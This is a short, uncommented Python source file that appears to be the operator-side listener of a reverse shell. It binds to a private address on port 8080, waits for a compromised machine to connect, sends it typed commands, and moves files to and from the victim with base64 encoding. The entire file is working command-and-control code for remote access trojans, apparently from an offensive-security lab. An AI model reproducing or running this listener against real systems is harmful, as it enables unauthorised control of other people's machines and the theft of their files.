import socket
import simplejson
import base64

class Socket_Listener():
    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        my_listener.bind((ip,port))
        my_listener.listen(0)
        print("Listening...")
        (self.my_connection,self.my_address) = my_listener.accept()
        print("Connection from " + str(self.my_address))
    
    def json_send(self,data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))
        
    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue

        
    def com_execute(self,command_input):
        self.json_send(command_input)
        if command_input[0] == "quit":
            self.my_connection.close()
            exit()
        return self.json_receive()
    
    def save_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "Download okey"
        
    def download_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())
        
    
    def start_listener(self):
        while True:
            com_input = input("Enter command: ")
            com_input = com_input.split(" ")
            try:
                if com_input[0] == "upload":
                    file_content = self.download_file(com_input[1])
                    com_input.append(file_content)
                com_output = self.com_execute(com_input)
                if com_input[0]== "download" and "Error" not in com_output:
                    com_output = self.save_file(com_input[1],com_output)
            except Exception:
                com_output = "Error"
                
            print(com_output)
            
my_socket_listener = Socket_Listener("10.0.2.4",8080)
my_socket_listener.start_listener()
        